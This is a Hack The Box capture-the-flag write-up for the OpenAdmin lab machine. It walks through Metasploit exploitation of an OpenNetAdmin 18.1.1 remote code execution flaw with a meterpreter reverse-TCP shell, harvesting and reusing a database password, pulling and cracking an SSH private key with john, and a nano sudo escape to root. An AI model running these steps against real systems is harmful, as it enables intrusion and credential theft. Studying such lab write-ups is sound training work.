---
title: "HTB: OpenAdmin"
author: ["Trae Horton", "https://sorsnce.com"]
date: "2020-01-14"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Writeup"
lang: "en"
titlepage: true
titlepage-color: "2d5c2a"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# Hack the Box: OpenAdmin

![OpenAdmin](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/OpenAdmin.jpg)

## Introduction

I thought this was a fun box, but kind of difficult for beginners. I never heard of OpenNetAdmin before this Hack the Box, but relized that this web service may contain more exploits that have not been reported. The box maker did a good job at guiding us to perform manual exploitating and giving us a nice simulation of how damaging this exploit could be.

## Objective

The objective of box is to simulate a real world use case of a software named: "OpenNetAdmin". If you google this software we will find the following description.

OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. A full CLI interface is available as well to use for scripting and bulk work. We hope to provide a useful Network Management application for managing your IP subnets, hosts and much more. Stop using spreadsheets to manage your network! Start doing proper IP address management!

## Requirements

The attacker will need the following software to exploit this box.

- NMAP
- Gobuster
- Metasploit
- GTFOBins
- Find


# Scanning/Enumeration

Target: `10.10.10.171`

```bash
root@kali:~$ sudo nmap -sS 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:09 EST
Nmap scan report for 10.10.10.171
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
root@kali:~$ 
```

Lets view what we can see on TCP Port 80:

![Apache](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/apache.png)

Now that we know there is a web server running on TCP port 80 lets perform a DirBuster:

```bash
root@kali:~/HTB/red-team$ sudo gobuster dir -u http://10.10.10.171 -w ~/HTB/red-team/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /home/traeh/HTB/red-team/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/19 20:16:02 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)

```

We immediately see a directory named "music", let's browse to that directory and see what we can find.

![Music](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/music.JPG)

We see a button within the dropdown menu that allows us to log into this site, lets click on that hyperlink and see what happens.

![ONA](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/ONA.JPG)

We can now see that this box is running something called OpenNetAdmin with a version of `18.1.1`. Lets perform a quick Google search to find out more infomatino about this product.

## OpenNetAdmin

We quickly see that there is an active (RCE) exploit for OpenNetAdmin version `18.1.1`. There appears to be two exploits available  within exploit-db, one appears to be a manual exploit via PHP and the other appears to use Metasploit. 

![Google-ONA](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/Google.JPG)

Lets search our Metasploit instance to see if we have a copy of this RCE exploit.

```bash
root@kali:~/HTB/red-team/HTB/Beta# msfconsole
[-] ***rtinG the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

+ -- --=[ metasploit v5.0.62-dev                          ]
+ -- --=[ 1950 exploits - 1090 auxiliary - 334 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search OpenNetAdmin
[-] No results from search
msf5 >
```

It appears at the time of writing this report, this exploit is not in Metasploit's database by default. We can try updating the database but more than likely it will not pull the latest copy of this exploit. Let's manually add this exploit to our Metasploit instance by using the following code:

```bash
root@kali:~# wget https://www.exploit-db.com/raw/47772
--2020-01-21 15:11:24--  https://www.exploit-db.com/raw/47772
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com:443)... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3017 (2.9K) [text/plain]
Saving to: ‘47772’  
47772 100%[=================================================>] 2.95K
2020-01-21 15:11:24 (20.4 MB/s) - ‘47772’ saved [3017/3017]
root@kali:~# mkdir -p ~/.msf4/modules/exploits/custom
root@kali:~# mv 47772 ~/.msf4/modules/exploits/custom/ona.rb
```

# Exploiting

Now that we have the Metasploit exploit within our database lets attempt to run this exploit:

```bash
msf5 > use exploit/custom/ona
msf5 exploit(custom/ona) > set RHOST 10.10.10.171
RHOST => 10.10.10.171
msf5 exploit(custom/ona) > set TARGETURI /ona/
TARGETURL => /ona/
msf5 exploit(custom/ona) > set LHOST 10.10.10.10 #set to your VPN Address
LHOST => 10.10.10.10
msf5 exploit(custom/ona) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf5 exploit(custom/ona) > exploit

[*] Started reverse TCP handler on 10.10.10.10:4444
[*] Exploiting...
[*] Sending stage (3021284 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened at 2020-01-21 15:52:49 +0100
[*] Command Stager progress - 100.12% done (809/808 bytes)

meterpreter >
```

Success! We have a Meterpreter session!

## www-data

Now that we have access to this box let's try to get the `user.txt` flag:

```bash
meterpreter > shell
Process 2625 created.
Channel 1 created.
whoami
www-data
ls /home
jimmy
joanna
cd jimmy
/bin/sh: 3: cd: can't cd to jimmy
cd joanna
/bin/sh: 4: cd: can't cd to joanna
```

Well, it looks like `www-data` does not have access to view the home directories for the `user.txt` flag.

# Privilege Escalation

So we know the user `www-data` does not have access to the `user.txt` flag, so lets try and see if we can use `jimmy` or `joanna` to pivot to their accounts:

```bash
ls

config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```

I spent a lot of time looking through these directories for anything interesting, I was trying to get a good understanding of what the source code was doing under the hood. I came across this directory that looked interesting.

```bash
pwd
/opt/ona/www/local
ls
config
nmap_scans
plugins
```
I was initially interested in the `nmap_scans` directory, but then relized that those nmap scan would not help me with a static HTB. I looked in the `config` directory to see if there was anything critical information within the configuration that might be vulnerable:

```bash
ls
database_settings.inc.php
motd.txt.example
run_installer
```
`database_setting.inc.php` looks interesting, lets print the content of that file and review it:

```bash
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```

We found a database password to the local mysqli instance, one thing to note in HTB, if you find a password try it on other accounts, I will attempt to ssh to `jimmy` and `joanne`'s account with this database password:

```bash
msf5 exploit(custom/ona) > ssh jimmy@10.10.10.171
[*] exec: ssh jimmy@10.10.10.171

jimmy@10.10.10.171's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 22 16:10:30 UTC 2020

  System load:  0.0               Processes:             110
  Usage of /:   49.0% of 7.81GB   Users logged in:       0
  Memory usage: 17%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```

Golden we are now `jimmy`

## Jimmy

Now that we have access to `jimmy`'s account lets see if we can print the `user.txt` flag.

```bash
jimmy@openadmin:~$ ls
jimmy@openadmin:~$ pwd
/home/jimmy
jimmy@openadmin:~$
```
Looks like the `user.txt` flag is not in `jimmy`'s home directory, let's look in `joanna`'s home folder.

```bash
jimmy@openadmin:~$ cd /home/joanna/
-bash: cd: /home/joanna/: Permission denied
jimmy@openadmin:~$
```

No luck, we either have to perform privilege escalation on `jimmy`'s account or try to get logged in via `joanna`'s account. Let's first try to escalate `jimmy`'s account:

```bash
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy:
Sorry, user jimmy may not run sudo on openadmin.
jimmy@openadmin:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/bin/ping
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
```

It does'nt appear we can eaily escalation `jimmy`'s account. Let's try looking to see what directories `jimmy` has access to via his account and group he is listed under.

```bash
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:~$ find / -group internal 2>/dev/null
/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
jimmy@openadmin:~$
```

The `internal` directory looks quite interesting, lets go a head a cat the `index.php` and `main.php` and see what we can learn about these files.

```php
jimmy@openadmin:~$ cat /var/www/internal/index.php
<h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == 
              '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e
               ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->
jimmy@openadmin:~$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

As we review the php code we can see this looks like it may give us `joanna`'s RSA key to login via ssh `cat /home/joanna/.ssh/id_rsa`. To trigger the `main.php` code we need to make a post request jimmy's username and his hashed password. But the issue is we have no idea how to interact with this "hidden" website. We know that OpenNetAdmin is running on the webservice `apache2` we can attempt to look at the apache2 config to see what ports might be bound to specific URIs.

```bash
jimmy@openadmin:~$ ls /etc/apache2/sites-available/
default-ssl.conf  internal.conf  openadmin.conf
jimmy@openadmin:~$
```

We can see two configuration files, one being the "OpenAdmin" site and the other being "internal". Let's print the `internal.conf` file and see what we can learn.

```bash
jimmy@openadmin:~$ cat /etc/apache2/sites-available/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
jimmy@openadmin:~$
```

So we can see that this site is only accessible via "localhost" on port 52846. We can attempt to change the apache2 config to allow this website to be accessible for all address.

```bash
[ Error writing /etc/apache2/sites-available/internal.conf: Permission denied ]
```

So we cannot change the config to allow our attacking machine access to this website, we will have to rely on `curl` to talk to this website. First I struggled a lot with trying to send a `POST` request to submit a form to the `index.php` file. Alternatively I ran through the source code one more time and realized I can just call the `main.php` file directly.

```bash
jimmy@openadmin:~$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:~$
```

And BINGO, we have `joanne`'s RSA Private Key!

## Joanna

Let's try and ssh into `joanna`'s account via the RSA key.

```bash
root@kali:~# ssh joanna@10.10.10.171 -i ~/HTB/machines/OpenAdmin/key
Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
joanna@10.10.10.171's password:
Permission denied, please try again.
joanna@10.10.10.171's password:
fPermission denied, please try again.
joanna@10.10.10.171's password:
joanna@10.10.10.171: Permission denied (publickey,password).
root@kali:~#
```

Looks like we do not have the password to the RSA key. Let's try to crack the RSA key to get the password. First we need to unzip our wordlist. On Kali, unzip the rockyou.txt.gz file with the following commands:

```bash
root@kali:~# sudo gunzip /usr/share/wordlists/rockyou.txt.gz
root@kali:~# wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
```

Now we need to get the hash out of the RSA Private Key, to do this following the commands below.

```bash
root@kali:~# /usr/share/john/ssh2john.py ~/HTB/machines/OpenAdmin/key > ~/HTB/machines/OpenAdmin/rsa.hash
root@kali:~#
```

Now that we have the RSA hash let's try to crack the hash via `john` and the `rockyou` password list.

```bash
root@kali:~# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ~/HTB/machines/OpenAdmin/rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (/root/HTB/machines/OpenAdmin/key)
1g 0:00:00:16 DONE (2020-01-22 19:26) 0.06188g/s 887481p/s 887481c/s 887481C/s
Session completed
root@kali:~#
```

And voila! We have the password to `joanna`, the password is `bloodninjas`. Let's ssh into `joanna`'s account with the password of `bloodninjas`:

```bash
root@kali:~# ssh joanna@10.10.10.171 -i ~/HTB/machines/OpenAdmin/key
Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 22 18:34:42 UTC 2020

  System load:  0.0               Processes:             108
  Usage of /:   49.0% of 7.81GB   Users logged in:       0
  Memory usage: 27%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.
Last login: Wed Jan 22 18:29:19 2020 from 10.10.14.42
joanna@openadmin:~$
```

Let's print the output of `user.txt`:

```bash
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f
joanna@openadmin:~$
```

Awesome, now we just need the `root.txt` flag

## Root

Getting root access within this box is quite easy. Let's try the same privilege escalation technics we tried with `jimmy` but now with `joanna`'s account:

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:
    /usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$
```

Looks like we can run `sudo` on nano while reading the file `/opt/priv` without a password. Let's go a head attempt this privilege escalation.

```bash
GNU nano 2.9.3        /opt/priv 
```

Looks like we can run this file as root, but the file is empty. Let's look at GTFOBins to see if we can leverage a privilege escalation from nano as root.

The following code can be used to break out from restricted environments by spawning an interactive system shell.

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

Let's try this code on OpenAdmin:

```bash
Command to execute: reset; sh 1>&0 2>&0#
# whoami
root
#
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
#
```

YES! We got the `root.txt` flag. Now we can review what we learned.

# Additional Items

Personally I think this box was a bit harder for the beginner level. I would rank this box around a `4` for difficulty. We learned the following tools/techniques.

* Recon - Common Nmap and Gobuster usage
* Exploitation - Basic Metasploit usage
* Priv Esc - Moderate BASH enumeration to find hidden site and re-used password
* Root Esc - Commom GTFOBins Priv Esc

Now that we reviewed what we learned with this Hack The Box. Make sure you reset the Virtual Machine for the next user. Thank you for reviewing this walk-through and remember..... Happy Hacking!
